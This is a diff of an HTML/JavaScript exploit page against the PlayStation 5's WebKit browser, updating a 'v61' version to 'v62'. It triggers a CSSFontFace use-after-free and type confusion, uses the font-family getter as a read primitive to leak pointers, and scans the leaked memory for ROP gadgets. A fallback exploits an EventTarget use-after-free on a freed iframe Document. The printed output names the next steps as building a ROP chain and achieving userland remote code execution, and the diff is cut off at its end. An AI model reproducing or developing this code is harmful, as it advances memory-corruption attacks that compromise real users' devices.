@@ -2,17 +2,17 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 v61 - Integrated Scanner + Third Listener</title>
+<title>PS5 v62 - Read64 Scanner</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 html,body{width:100%;height:100%;background:#0a0a0a;color:#00ff41;
 font-family:'MS Gothic','Courier New',monospace;overflow:hidden}
 #out{position:fixed;top:0;left:0;right:0;bottom:0;
-padding:10px 14px;overflow-y:auto;font-size:13px;line-height:1.55;
+padding:10px 14px;overflow-y:auto;font-size:12px;line-height:1.5;
 -webkit-user-select:text}
 .ok{color:#00ff41}.er{color:#ff3333}.wr{color:#ffcc00}.hl{color:#00ffff;font-weight:bold}
-.mg{color:#ff00ff;font-weight:bold;font-size:15px}.dm{color:#006622}
-.hd{color:#00ff41;font-weight:bold;font-size:14px;letter-spacing:1px}
+.mg{color:#ff00ff;font-weight:bold;font-size:14px}.dm{color:#006622}
+.hd{color:#00ff41;font-weight:bold;font-size:13px;letter-spacing:1px}
 </style>
 <style id="s">
 @font-face{font-family:prepad;src:url(np.woff);unicode-range:U+E123}
@@ -29,68 +29,90 @@ function P(m,c){var s=document.createElement("span");if(c)s.className=c;
 s.textContent=m+"\n";O.appendChild(s);O.scrollTop=O.scrollHeight}
 function Ok(m){P("  ✅ "+m,"ok")}function Fl(m){P("  ✘ "+m,"er")}
 function Hi(m){P("  ► "+m,"hl")}function St(m){P("  ★ "+m+" ★","mg")}
-function Dm(m){P("  "+m,"dm")}function Wr(m){P("  ⚠ "+m,"wr")}
-function Hd(m){P("▸ "+m,"hd")}function Sep(){P("─".repeat(50),"dm")}
+function Dm(m){P("  "+m,"dm")}function Hd(m){P("▸ "+m,"hd")}
+function Sep(){P("─".repeat(50),"dm")}
 
 window.onerror=function(m,s,l){Fl("CRASH: "+m.substring(0,80)+" @"+l);return true};
 
 // ============================================================
-// MEMORY MANAGER UTILITIES
+// MEMORY UTILITIES
 // ============================================================
-var MemMgr = {
-    // Convert float64 to hex string
-    f2h: function(f) {
-        var buf = new ArrayBuffer(8);
-        new Float64Array(buf)[0] = f;
-        var bytes = new Uint8Array(buf);
+var Mem = {
+    // String to hex bytes (little-endian decode)
+    strToHex: function(str, maxLen) {
+        if (!maxLen) maxLen = str.length;
         var hex = "";
-        for (var i = 7; i >= 0; i--) {
-            var b = bytes[i].toString(16);
-            hex += (b.length === 1 ? "0" + b : b);
-        }
-        return "0x" + hex;
-    },
-    
-    // Convert hex string to float64
-    h2f: function(h) {
-        var clean = h.replace("0x", "");
-        if (clean.length < 16) clean = "0".repeat(16 - clean.length) + clean;
-        var buf = new ArrayBuffer(8);
-        var bytes = new Uint8Array(buf);
-        for (var i = 0; i < 8; i++) {
-            bytes[i] = parseInt(clean.substring(14 - i*2, 16 - i*2), 16);
-        }
-        return new Float64Array(buf)[0];
-    },
-    
-    // Convert string bytes to hex (for family leak decoding)
-    stringToHex: function(str) {
-        var hex = "";
-        for (var i = 0; i < Math.min(str.length, 64); i++) {
+        for (var i = 0; i < Math.min(str.length, maxLen); i++) {
             var code = str.charCodeAt(i);
-            var h = code.toString(16);
+            var h = (code & 0xFF).toString(16);
             hex += (h.length === 1 ? "0" + h : h) + " ";
-            if ((i + 1) % 16 === 0) hex += "\n  ";
         }
-        return hex;
+        return hex.trim();
     },
     
-    // Convert string to 64-bit pointer (little-endian, first 8 chars)
-    stringToPtr: function(str) {
-        if (!str || str.length < 1) return "0x0000000000000000";
-        var hex = "";
+    // String to 64-bit value (little-endian, first 8 chars)
+    strToU64: function(str) {
+        if (!str || str.length < 1) return 0n;
+        var val = 0n;
         for (var i = 0; i < Math.min(str.length, 8); i++) {
-            var code = str.charCodeAt(i);
-            var h = code.toString(16);
-            hex = (h.length === 1 ? "0" + h : h) + hex;
+            var code = BigInt(str.charCodeAt(i) & 0xFF);
+            val |= (code << BigInt(i * 8));
         }
-        while (hex.length < 16) hex = "0" + hex;
-        return "0x" + hex;
+        return val;
+    },
+    
+    // Check if value looks like a pointer
+    isPointer: function(val) {
+        if (typeof val !== "bigint") return false;
+        var hi = Number(val >> 32n);
+        var lo = Number(val & 0xFFFFFFFFn);
+        // PS5 userland pointers typically have hi=0x0000 or hi=0x0001
+        if (hi === 0 || hi === 1) return lo > 0x10000;
+        // Kernel pointers have hi=0xFFFF
+        if (hi === 0xFFFF) return true;
+        return false;
+    },
+    
+    // Format bigint as hex
+    bigToHex: function(val) {
+        return "0x" + val.toString(16).padStart(16, "0");
+    },
+    
+    // Check if bytes contain ROP gadget patterns
+    findGadgets: function(hexStr) {
+        var gadgets = {
+            "5f c3": "pop rdi; ret",
+            "5e c3": "pop rsi; ret",
+            "5a c3": "pop rdx; ret",
+            "58 c3": "pop rax; ret",
+            "59 c3": "pop rcx; ret",
+            "41 58 c3": "pop r8; ret",
+            "41 59 c3": "pop r9; ret",
+            "0f 05 c3": "syscall; ret",
+            "0f 05": "syscall",
+            "c3": "ret",
+            "48 87 e3": "xchg rsp, rbx",
+            "48 94": "xchg rsp, rax",
+        };
+        var found = [];
+        var lower = hexStr.toLowerCase().replace(/\s/g, "");
+        for (var pattern in gadgets) {
+            var cleanPattern = pattern.replace(/\s/g, "");
+            var idx = lower.indexOf(cleanPattern);
+            if (idx !== -1 && idx % 2 === 0) {
+                found.push({
+                    offset: idx / 2,
+                    bytes: pattern,
+                    name: gadgets[pattern]
+                });
+            }
+        }
+        return found;
     }
 };
 
 P("════════════════════════════════════","hd");
-P("  v61 — Integrated Scanner + 3rd Listener","hd");
+P("  v62 — Read64 Scanner via font-family","hd");
 P("════════════════════════════════════","hd");
 P("");
 
@@ -105,7 +127,7 @@ var sh=document.getElementById("s").sheet;
 var keep=[],holes=[],trigger=null,uafOk=false;
 
 // ============================================================
-// PHASE 1: CSSFONTFACE UAF SETUP
+// PHASE 1: CSSFONTFACE UAF SETUP (identical to v46)
 // ============================================================
 Sep();Hd("PHASE 1: CSSFontFace UAF Setup");Sep();
 
@@ -172,7 +194,6 @@ document.fonts.load("1em trigger, x", "AB").then(function(faces) {
     St("RECLAIMED: " + aFamily);
     keep.push(faces); keep.push(aFace);
     
-    // Find CSSRule
     var aIndex = -1;
     for (var i = 0; i < sh.cssRules.length; i++) {
         try {
@@ -195,302 +216,449 @@ document.fonts.load("1em trigger, x", "AB").then(function(faces) {
     Ok("Confusion ALIVE — weight = 700");
     
     // ============================================================
-    // PHASE 3: CSSFONTFACE MEMORY SCANNER (via m_family 0x20)
+    // PHASE 3: READ64 SCANNER VIA font-family GETTER
     // ============================================================
-    Sep();Hd("PHASE 3: CSSFontFace Memory Scanner (m_family 0x20)");Sep();
-    P("  Testing if font-family getter leaks pointer data...","dm");
+    Sep();Hd("PHASE 3: Read64 Scanner via font-family Getter");Sep();
+    P("  Scanning memory through CSSFontFace m_family dereference...","dm");
+    P("  The C++ getter dereferences pointer at offset 0x20","dm");
+    P("  and returns the data as a JavaScript string.","dm");
     P("");
     
-    // Test 1: Read family with different values — check for pointer leaks
-    Hd("Test 1: Family getter pointer leak check");
+    var scanResults = [];
+    var pointerLeaks = [];
+    var gadgetFindings = [];
     
-    var testValues = ["test", "AAAA", "BBBB", "\u4141\u4141", "x"];
-    for (var ti = 0; ti < testValues.length; ti++) {
-        var val = testValues[ti];
+    // === SCAN 1: Baseline reads with different family values ===
+    Hd("SCAN 1: Baseline reads");
+    
+    var testFamilies = [
+        "test",
+        "AAAA",
+        "BBBB",
+        "\u4141\u4141\u4141\u4141",
+        "\u0000\u0000\u0000\u0000",
+        "\uFFFF\uFFFF\uFFFF\uFFFF",
+        "x",
+        "",
+        "normal",
+        "serif",
+        "monospace"
+    ];
+    
+    for (var ti = 0; ti < testFamilies.length; ti++) {
+        var writeVal = testFamilies[ti];
+        var writeDisplay = writeVal.length === 0 ? "(empty)" : 
+                          writeVal.replace(/[\u0000-\u001F\u007F-\uFFFF]/g, function(c) {
+                              return "\\u" + c.charCodeAt(0).toString(16).padStart(4, "0");
+                          });
+        
         try {
-            aStyle.setProperty("font-family", val); fs();
+            aStyle.setProperty("font-family", writeVal); fs();
             var readVal = aFace.family;
-            P("  Write: '" + val + "' → Read: '" + readVal + "'", "dm");
+            var readHex = Mem.strToHex(readVal, 64);
+            var readU64 = Mem.strToU64(readVal);
+            var isPtr = Mem.isPointer(readU64);
+            var hasNonASCII = /[^\x20-\x7E]/.test(readVal);
             
-            // Check if read value contains non-ASCII bytes (potential pointer data)
-            var hasNonASCII = false;
-            for (var ci = 0; ci < readVal.length; ci++) {
-                if (readVal.charCodeAt(ci) > 127 || readVal.charCodeAt(ci) < 32) {
-                    hasNonASCII = true;
-                    break;
+            P("  Write: '" + writeDisplay + "' → Read: '" + 
+              (hasNonASCII ? "(non-ASCII, " + readVal.length + " bytes)" : readVal) + "'", "dm");
+            P("    Hex: " + readHex, "dm");
+            
+            if (isPtr) {
+                Hi("    POINTER DETECTED: " + Mem.bigToHex(readU64));
+                pointerLeaks.push({
+                    writeVal: writeDisplay,
+                    readVal: readVal,
+                    hex: readHex,
+                    ptr: readU64,
+                    ptrHex: Mem.bigToHex(readU64)
+                });
+            }
+            
+            if (hasNonASCII) {
+                Hi("    NON-ASCII DATA — possible raw memory leak!");
+            }
+            
+            // Search for ROP gadgets in the leaked data
+            var gadgets = Mem.findGadgets(readHex);
+            if (gadgets.length > 0) {
+                St("    ROP GADGETS FOUND!");
+                for (var gi = 0; gi < gadgets.length; gi++) {
+                    P("      @offset " + gadgets[gi].offset + ": " + 
+                      gadgets[gi].bytes + " = " + gadgets[gi].name, "hl");
+                    gadgetFindings.push({
+                        writeVal: writeDisplay,
+                        offset: gadgets[gi].offset,
+                        bytes: gadgets[gi].bytes,
+                        name: gadgets[gi].name,
+                        context: readHex
+                    });
                 }
             }
-            if (hasNonASCII) {
-                Hi("  NON-ASCII DATA DETECTED — possible pointer leak!");
-                P("  Hex: " + MemMgr.stringToHex(readVal), "hl");
-            }
             
-            // Check if read value is unexpectedly long
-            if (readVal.length > val.length + 10) {
-                Hi("  UNUSUAL LENGTH — read value longer than expected!");
-                P("  Hex: " + MemMgr.stringToHex(readVal), "hl");
-            }
+            scanResults.push({
+                write: writeDisplay,
+                read: readVal,
+                hex: readHex,
+                u64: readU64,
+                isPtr: isPtr,
+                hasNonASCII: hasNonASCII,
+                gadgets: gadgets
+            });
+            
         } catch(e) {
             Fl("  Error: " + e.message);
         }
+        P("");
+    }
+    
+    // === SCAN 2: Repeated reads to check for stale data ===
+    Hd("SCAN 2: Repeated reads (stale pointer check)");
+    
+    // Set a known value first
+    aStyle.setProperty("font-family", "marker_value_1"); fs();
+    var r1 = aFace.family;
+    P("  Read 1: " + r1 + " (hex: " + Mem.strToHex(r1, 32) + ")", "dm");
+    
+    // Don't change family — read again
+    var r2 = aFace.family;
+    P("  Read 2 (same): " + r2 + " (hex: " + Mem.strToHex(r2, 32) + ")", "dm");
+    
+    // Change to new value
+    aStyle.setProperty("font-family", "marker_value_2"); fs();
+    var r3 = aFace.family;
+    P("  Read 3 (changed): " + r3 + " (hex: " + Mem.strToHex(r3, 32) + ")", "dm");
+    
+    // Read again without changing
+    var r4 = aFace.family;
+    P("  Read 4 (same): " + r4 + " (hex: " + Mem.strToHex(r4, 32) + ")", "dm");
+    
+    if (r1 !== r2) {
+        Hi("  STALE POINTER: Read 1 ≠ Read 2 (same value)!");
+    }
+    if (r3 !== r4) {
+        Hi("  STALE POINTER: Read 3 ≠ Read 4 (same value)!");
     }
     P("");
     
-    // Test 2: Change family rapidly and check for stale pointer data
-    Hd("Test 2: Stale pointer check");
-    aStyle.setProperty("font-family", "first_value"); fs();
-    var read1 = aFace.family;
-    aStyle.setProperty("font-family", "second_value"); fs();
-    var read2 = aFace.family;
-    aStyle.setProperty("font-family", "third_value"); fs();
-    var read3 = aFace.family;
+    // === SCAN 3: Try to leak heap metadata ===
+    Hd("SCAN 3: Heap metadata probe");
     
-    P("  1st: " + read1, "dm");
-    P("  2nd: " + read2, "dm");
-    P("  3rd: " + read3, "dm");
+    // Rapidly change family to force CSSValueList allocation/deallocation
+    P("  Rapidly cycling family values to trigger CSSValueList churn...","dm");
     
-    if (read1 === read2 || read2 === read3 || read1 === read3) {
-        Wr("  Values match unexpectedly — possible caching");
+    var cycleResults = [];
+    for (var ci = 0; ci < 20; ci++) {
+        try {
+            aStyle.setProperty("font-family", "cycle_" + ci); fs();
+            var rv = aFace.family;
+            var hex = Mem.strToHex(rv, 16);
+            var u64 = Mem.strToU64(rv);
+            var isPtr = Mem.isPointer(u64);
+            
+            if (rv !== "cycle_" + ci || isPtr) {
+                P("  Cycle " + ci + ": MISMATCH!", "wr");
+                P("    Expected: cycle_" + ci, "dm");
+                P("    Got: " + (/[^\x20-\x7E]/.test(rv) ? "(non-ASCII)" : rv), "dm");
+                P("    Hex: " + hex, "dm");
+                if (isPtr) Hi("    PTR: " + Mem.bigToHex(u64));
+                
+                cycleResults.push({
+                    cycle: ci,
+                    expected: "cycle_" + ci,
+                    got: rv,
+                    hex: hex,
+                    ptr: isPtr ? Mem.bigToHex(u64) : null
+                });
+            }
+        } catch(e) {}
+    }
+    
+    if (cycleResults.length > 0) {
+        St("  " + cycleResults.length + " mismatches detected — possible stale pointer reads!");
     } else {
-        Ok("  All values different — no caching detected");
+        Dm("  All 20 cycles matched — no stale pointer detected in this test");
     }
     P("");
     
-    // Test 3: Try to read internal object data via family
-    Hd("Test 3: Internal object data probe");
+    // === SCAN 4: Force GC between reads ===
+    Hd("SCAN 4: GC between reads");
     
-    // Set family to empty/minimal and see what the getter returns
-    try {
-        aStyle.setProperty("font-family", ""); fs();
-        var empty = aFace.family;
-        P("  Empty family read: '" + empty + "' (len=" + empty.length + ")", "dm");
-        if (empty.length > 0) {
-            Hi("  NON-EMPTY return from empty family — possible leak!");
-            P("  Hex: " + MemMgr.stringToHex(empty), "hl");
+    aStyle.setProperty("font-family", "pre_gc_value"); fs();
+    var preGC = aFace.family;
+    P("  Pre-GC: " + preGC + " (hex: " + Mem.strToHex(preGC, 16) + ")", "dm");
+    
+    // Force GC
+    P("  Forcing GC (32MB)...","dm");
+    for (var i = 0; i < 8; i++) {
+        var t = [];
+        for (var j = 0; j < 256; j++) t.push(new ArrayBuffer(65536));
+    }
+    fs();
+    
+    // Read again without changing family
+    var postGC = aFace.family;
+    P("  Post-GC: " + postGC + " (hex: " + Mem.strToHex(postGC, 16) + ")", "dm");
+    
+    if (preGC !== postGC) {
+        St("  GC CHANGED THE VALUE — pointer was freed and reclaimed!");
+        Hi("  Pre-GC hex: " + Mem.strToHex(preGC, 32));
+        Hi("  Post-GC hex: " + Mem.strToHex(postGC, 32));
+        
+        // Check if post-GC value contains pointer data
+        var postU64 = Mem.strToU64(postGC);
+        if (Mem.isPointer(postU64)) {
+            Hi("  POST-GC POINTER: " + Mem.bigToHex(postU64));
+            pointerLeaks.push({
+                writeVal: "pre_gc_value",
+                readVal: postGC,
+                hex: Mem.strToHex(postGC, 64),
+                ptr: postU64,
+                ptrHex: Mem.bigToHex(postU64),
+                source: "post-GC stale read"
+            });
         }
-    } catch(e) {
-        P("  Empty family error: " + e.message, "er");
-    }
-    
-    // Try setting family to a number (CSSOM should reject)
-    try {
-        aStyle.setProperty("font-family", "12345"); fs();
-        var num = aFace.family;
-        P("  Numeric family: '" + num + "'", "dm");
-    } catch(e) {
-        P("  Numeric family error: " + e.message, "er");
+        
+        // Search for gadgets in post-GC data
+        var postGadgets = Mem.findGadgets(Mem.strToHex(postGC, 64));
+        if (postGadgets.length > 0) {
+            St("  ROP GADGETS IN POST-GC DATA!");
+            for (var gi = 0; gi < postGadgets.length; gi++) {
+                P("    @offset " + postGadgets[gi].offset + ": " + 
+                  postGadgets[gi].bytes + " = " + postGadgets[gi].name, "hl");
+                gadgetFindings.push({
+                    writeVal: "post-GC",
+                    offset: postGadgets[gi].offset,
+                    bytes: postGadgets[gi].bytes,
+                    name: postGadgets[gi].name,
+                    context: Mem.strToHex(postGC, 64)
+                });
+            }
+        }
+    } else {
+        Dm("  GC did not change the value");
     }
     P("");
     
-    // ============================================================
-    // PHASE 4: EVENTTARGET UAF — THIRD LISTENER TEST
-    // ============================================================
-    Sep();Hd("PHASE 4: EventTarget UAF — Third Listener");Sep();
-    P("  Testing if third listener can read freed Document...","dm");
-    P("");
+    // === SCAN 5: Multiple GC cycles ===
+    Hd("SCAN 5: Multiple GC cycles");
     
-    var etResults = [];
-    
-    try {
-        var f2 = document.body.appendChild(document.createElement('iframe'));
-        var a2 = document.createElement('div');
-        var b2 = a2.appendChild(document.createElement('div'));
+    for (var gci = 0; gci < 5; gci++) {
+        aStyle.setProperty("font-family", "gc_test_" + gci); fs();
+        var beforeVal = aFace.family;
+        var beforeHex = Mem.strToHex(beforeVal, 32);
         
-        P("  iframe created, URL: " + f2.contentDocument.URL, "dm");
+        // Force GC
+        for (var i = 0; i < 4; i++) {
+            var t = [];
+            for (var j = 0; j < 128; j++) t.push(new ArrayBuffer(65536));
+        }
+        fs();
         
-        // LISTENER 1: Free Document + GC + spray
-        a2.addEventListener('b', function() {
-            P("\n  [L1] Freeing Document...", "dm");
-            document.adoptNode(a2);
-            f2.remove();
+        var afterVal = aFace.family;
+        var afterHex = Mem.strToHex(afterVal, 32);
+        
+        if (beforeVal !== afterVal) {
+            Hi("  GC cycle " + gci + ": VALUE CHANGED!");
+            P("    Before: " + beforeHex, "dm");
+            P("    After:  " + afterHex, "dm");
             
-            // Force GC
-            P("  [L1] GC pressure (32MB)...", "dm");
-            for (var i = 0; i < 8; i++) {
-                var t = [];
-                for (var j = 0; j < 256; j++) t.push(new ArrayBuffer(65536));
+            var afterU64 = Mem.strToU64(afterVal);
+            if (Mem.isPointer(afterU64)) {
+                Hi("    POINTER: " + Mem.bigToHex(afterU64));
+                pointerLeaks.push({
+                    writeVal: "gc_test_" + gci,
+                    readVal: afterVal,
+                    hex: afterHex,
+                    ptr: afterU64,
+                    ptrHex: Mem.bigToHex(afterU64),
+                    source: "GC cycle " + gci
+                });
             }
             
-            // Spray Float64Arrays to reclaim freed slot
-            P("  [L1] Spraying 500 Float64Arrays...", "dm");
-            var spray = [];
-            for (var i = 0; i < 500; i++) {
-                var buf = new ArrayBuffer(256);
-                var f64 = new Float64Array(buf);
-                f64[0] = 1.1;
-                f64[1] = 2.2;
-                spray.push(f64);
-            }
-            
-            // Throw to continue to next listener
-            throw {
-                line: 1,
-                column: 1,
-                sourceURL: 'X'.repeat(1024 * 1024) // 1MB spray
-            };
-        });
-        
-        // LISTENER 2: Buffer
-        a2.addEventListener('b', function() {
-            P("  [L2] Buffer listener executed", "dm");
-        });
-        
-        // LISTENER 3: Read freed Document
-        a2.addEventListener('b', function() {
-            P("  [L3] Third listener — reading freed Document...\n", "hl");
-            
-            var doc = null;
-            try {
-                doc = f2.contentDocument;
-                if (doc) {
-                    Hi("  f2.contentDocument is NOT null!");
-                } else {
-                    P("  f2.contentDocument is null", "dm");
+            var gcGadgets = Mem.findGadgets(afterHex);
+            if (gcGadgets.length > 0) {
+                St("    GADGETS FOUND!");
+                for (var gi = 0; gi < gcGadgets.length; gi++) {
+                    P("      @offset " + gcGadgets[gi].offset + ": " + 
+                      gcGadgets[gi].name, "hl");
                 }
-            } catch(e) {
-                Fl("  f2.contentDocument error: " + e.message);
             }
+        } else {
+            Dm("  GC cycle " + gci + ": no change");
+        }
+    }
+    P("");
+    
+    // ============================================================
+    // PHASE 4: ANALYSIS & SUMMARY
+    // ============================================================
+    Sep();Hd("PHASE 4: Analysis & Summary");Sep();
+    P("");
+    
+    P("  SCAN RESULTS:","hd");
+    P("  Total reads: " + scanResults.length + " + " + cycleResults.length + " cycles + 5 GC cycles");
+    P("  Pointer leaks: " + pointerLeaks.length, pointerLeaks.length > 0 ? "hl" : "dm");
+    P("  ROP gadgets found: " + gadgetFindings.length, gadgetFindings.length > 0 ? "hl" : "dm");
+    P("  Stale pointer mismatches: " + cycleResults.length, cycleResults.length > 0 ? "hl" : "dm");
+    P("");
+    
+    if (pointerLeaks.length > 0) {
+        St("★ POINTER LEAKS DETECTED! ★");
+        P("");
+        P("  Leaked pointers:","hd");
+        for (var i = 0; i < pointerLeaks.length; i++) {
+            var pl = pointerLeaks[i];
+            P("  [" + i + "] " + pl.ptrHex + " (source: " + pl.source + ")");
+            P("      hex: " + pl.hex, "dm");
+        }
+        P("");
+        Hi("  These pointers can be used to:");
+        Hi("  1. Calculate WebKit base address");
+        Hi("  2. Locate ROP gadgets");
+        Hi("  3. Build ROP chain");
+        Hi("  4. Achieve Userland RCE");
+    }
+    
+    if (gadgetFindings.length > 0) {
+        St("★ ROP GADGETS FOUND IN LEAKED MEMORY! ★");
+        P("");
+        P("  Gadgets:","hd");
+        for (var i = 0; i < gadgetFindings.length; i++) {
+            var g = gadgetFindings[i];
+            P("  [" + i + "] " + g.name + " (" + g.bytes + ")");
+            P("      source: " + g.writeVal, "dm");
+            P("      context: " + g.context.substring(0, 48) + "...", "dm");
+        }
+    }
+    
+    if (pointerLeaks.length === 0 && gadgetFindings.length === 0) {
+        Wr("  No pointers or gadgets detected in this scan.");
+        Wr("  The font-family getter may not be leaking raw memory.");
+        Wr("  Try: EventTarget UAF with third listener for alternative leak.");
+    }
+    
+    P("");
+    
+    // === PHASE 5: EVENTTARGET THIRD LISTENER (if no leaks above) ===
+    if (pointerLeaks.length === 0) {
+        Sep();Hd("PHASE 5: EventTarget Third Listener (fallback)");Sep();
+        P("  No pointer leaks from font-family. Testing third listener...","dm");
+        P("");
+        
+        try {
+            var f2 = document.body.appendChild(document.createElement('iframe'));
+            var a2 = document.createElement('div');
+            var b2 = a2.appendChild(document.createElement('div'));
             
-            if (doc) {
-                // Read all properties
-                var props = [
-                    "nodeType", "nodeName", "URL", "title", "domain",
-                    "referrer", "cookie", "readyState", "compatMode",
-                    "characterSet", "contentType", "documentElement",
-                    "head", "body", "images", "links", "forms", "scripts",
-                    "styleSheets", "fonts", "implementation", "location",
-                    "defaultView", "activeElement", "currentScript",
-                    "visibilityState", "hidden", "fullscreenEnabled",
-                    "childElementCount", "firstElementChild", "lastElementChild"
-                ];
+            a2.addEventListener('c', function() {
+                document.adoptNode(a2);
+                f2.remove();
+                for (var i = 0; i < 8; i++) {
+                    var t = [];
+                    for (var j = 0; j < 256; j++) t.push(new ArrayBuffer(65536));
+                }
+                throw { sourceURL: 'X'.repeat(1024 * 1024) };
+            });
+            
+            a2.addEventListener('c', function() {});
+            
+            a2.addEventListener('c', function() {
+                P("  [L3] Reading freed Document via f2.contentDocument...","hl");
                 
-                var unusualCount = 0;
-                
-                for (var i = 0; i < props.length; i++) {
-                    try {
-                        var val = doc[props[i]];
-                        var str = String(val);
-                        var unusual = false;
+                try {
+                    var doc = f2.contentDocument;
+                    if (doc) {
+                        Hi("  f2.contentDocument is NOT null!");
                         
-                        // Check for pointer-like numbers
-                        if (typeof val === "number" && val > 0x10000) {
-                            unusual = true;
-                            Hi("  [+] " + props[i] + " = " + val + " (0x" + val.toString(16) + ") ← LEAK");
-                        }
-                        // Check for non-ASCII (raw memory)
-                        else if (/[^\x20-\x7E]/.test(str) && str !== "[object HTMLDocument]") {
-                            unusual = true;
-                            Hi("  [+] " + props[i] + " = " + str + " ← NON-ASCII");
-                            P("    Hex: " + MemMgr.stringToHex(str), "hl");
-                        }
-                        // Check for changed defaults
-                        else if (props[i] === "nodeType" && val !== 9) {
-                            unusual = true;
-                            Hi("  [+] " + props[i] + " = " + val + " ← EXPECTED 9");
-                        }
-                        else if (props[i] === "URL" && val !== "about:blank") {
-                            unusual = true;
-                            Hi("  [+] " + props[i] + " = " + val + " ← EXPECTED about:blank");
-                        }
-                        else if (props[i] === "readyState" && val !== "complete") {
-                            unusual = true;
-                            Hi("  [+] " + props[i] + " = " + val + " ← EXPECTED complete");
-                        }
-                        else if (props[i] === "characterSet" && val !== "UTF-8") {
-                            unusual = true;
-                            Hi("  [+] " + props[i] + " = " + val + " ← EXPECTED UTF-8");
-                        }
-                        else if (props[i] === "contentType" && val !== "text/html") {
-                            unusual = true;
-                            Hi("  [+] " + props[i] + " = " + val + " ← EXPECTED text/html");
+                        var props = [
+                            "nodeType", "URL", "title", "domain",
+                            "readyState", "characterSet", "contentType",
+                            "documentElement", "body", "location",
+                            "defaultView", "activeElement"
+                        ];
+                        
+                        var unusualCount = 0;
+                        for (var i = 0; i < props.length; i++) {
+                            try {
+                                var val = doc[props[i]];
+                                var str = String(val);
+                                var unusual = false;
+                                
+                                if (typeof val === "number" && val > 0x10000) {
+                                    unusual = true;
+                                    Hi("  [+] " + props[i] + " = " + val + " (0x" + val.toString(16) + ") ← LEAK");
+                                    pointerLeaks.push({
+                                        ptr: BigInt(val),
+                                        ptrHex: "0x" + val.toString(16),
+                                        source: "EventTarget L3 " + props[i]
+                                    });
+                                }
+                                else if (/[^\x20-\x7E]/.test(str) && str !== "[object HTMLDocument]") {
+                                    unusual = true;
+                                    Hi("  [+] " + props[i] + " = (non-ASCII) ← LEAK");
+                                    P("    hex: " + Mem.strToHex(str, 32), "hl");
+                                }
+                                else if (props[i] === "nodeType" && val !== 9) {
+                                    unusual = true;
+                                    Hi("  [+] " + props[i] + " = " + val + " ← EXPECTED 9");
+                                }
+                                else if (props[i] === "URL" && val !== "about:blank") {
+                                    unusual = true;
+                                    Hi("  [+] " + props[i] + " = " + val + " ← EXPECTED about:blank");
+                                }
+                                
+                                if (unusual) unusualCount++;
+                                else P("  [-] " + props[i] + " = " + str, "dm");
+                            } catch(e) {
+                                P("  [!] " + props[i] + " error: " + e.message, "er");
+                            }
                         }
                         
-                        if (unusual) unusualCount++;
-                        else P("  [-] " + props[i] + " = " + str, "dm");
-                        
-                        etResults.push({prop: props[i], value: val, unusual: unusual});
-                    } catch(e) {
-                        P("  [!] " + props[i] + " error: " + e.message, "er");
-                        etResults.push({prop: props[i], error: e.message, unusual: false});
+                        if (unusualCount > 0) {
+                            St("  ★ INFO LEAK VIA THIRD LISTENER! ★");
+                        }
+                    } else {
+                        P("  f2.contentDocument is null", "dm");
                     }
-                }
-                
-                // Additional probes
-                P("\n  Additional probes:", "hd");
-                
-                try {
-                    var ts = doc.toString();
-                    P("  toString: " + ts, "dm");
-                    if (ts !== "[object HTMLDocument]") Hi("  UNUSUAL toString!");
-                } catch(e) { P("  toString error: " + e.message, "er"); }
-                
-                try {
-                    var keys = Object.keys(doc);
-                    P("  Object.keys: " + keys.join(", "), "dm");
-                } catch(e) { P("  Object.keys error: " + e.message, "er"); }
-                
-                try {
-                    var names = Object.getOwnPropertyNames(doc);
-                    P("  getOwnPropertyNames: " + names.join(", "), "dm");
-                } catch(e) { P("  getOwnPropertyNames error: " + e.message, "er"); }
-                
-                try {
-                    var ownKeys = Reflect.ownKeys(doc);
-                    P("  Reflect.ownKeys: " + ownKeys.join(", "), "dm");
-                } catch(e) { P("  Reflect.ownKeys error: " + e.message, "er"); }
-                
-                try {
-                    var proto = Object.getPrototypeOf(doc);
-                    P("  prototype: " + proto, "dm");
-                } catch(e) { P("  prototype error: " + e.message, "er"); }
-                
-                // Summary
-                P("\n  EventTarget Summary:", "hd");
-                P("  Unusual values: " + unusualCount, unusualCount > 0 ? "hl" : "dm");
-                
-                if (unusualCount > 0) {
-                    St("  ★ INFO LEAK DETECTED VIA THIRD LISTENER! ★");
-                } else {
-                    P("  No unusual values — Document may not be freed", "wr");
-                }
-            } else {
-                Wr("  No document — trying f2 directly");
-                try {
-                    P("  f2.tagName: " + f2.tagName, "dm");
-                    P("  f2.parentNode: " + (f2.parentNode ? f2.parentNode.nodeName : "null"), "dm");
-                    P("  f2.contentWindow: " + f2.contentWindow, "dm");
                 } catch(e) {
-                    Fl("  f2 access error: " + e.message);
+                    Fl("  f2.contentDocument error: " + e.message);
                 }
-            }
-        });
-        
-        // Dispatch
-        P("\n  Dispatching event 'b'...", "dm");
-        b2.dispatchEvent(new Event('b', { bubbles: true }));
-        
-        P("\n  [+] Browser survived!", "ok");
-        
-    } catch(e) {
-        Fl("  EventTarget error: " + e.message);
+            });
+            
+            b2.dispatchEvent(new Event('c', { bubbles: true }));
+            Ok("  EventTarget test survived");
+            
+        } catch(e) {
+            Fl("  EventTarget error: " + e.message);
+        }
     }
     
-    // ============================================================
-    // PHASE 5: FINAL SUMMARY
-    // ============================================================
+    // === FINAL SUMMARY ===
     P("");
-    Sep();Hd("PHASE 5: Final Summary");Sep();
+    Sep();Hd("FINAL SUMMARY");Sep();
     P("");
     P("  ╔═══════════════════════════════════════════════╗");
-    P("  ║  CSSFontFace UAF: ✅ STABLE (17+ channels)    ║");
-    P("  ║  m_wrapper offset: ✅ 0x80 (confirmed)        ║");
-    P("  ║  wrapper() trigger: ✅ WORKING                ║");
-    P("  ║  EventTarget UAF: ✅ CRASH CONFIRMED          ║");
-    P("  ║  Third Listener: TESTED ABOVE                 ║");
-    P("  ║  m_family scanner: TESTED ABOVE               ║");
+    P("  ║  CSSFontFace UAF: ✅ STABLE                    ║");
+    P("  ║  Confusion: ✅ ALIVE                            ║");
+    P("  ║  font-family scanner: TESTED                   ║");
+    P("  ║  Pointer leaks: " + pointerLeaks.length + "                              ║");
+    P("  ║  ROP gadgets: " + gadgetFindings.length + "                               ║");
+    P("  ║  EventTarget L3: TESTED                        ║");
     P("  ╚═══════════════════════════════════════════════╝");
     P("");
-    St("★ INTEGRATED TEST COMPLETE ★");
+    
+    if (pointerLeaks.length > 0) {
+        St("★ READ64 ORACLE OPERATIONAL ★");
+        P("");
+        P("  Next steps:","hd");
+        P("  1. Calculate WebKit base from leaked pointer");
+        P("  2. Scan .text for ROP gadgets");
+        P("  3. Build ROP chain");
+        P("  4. Execute Userland RCE");
+    } else {
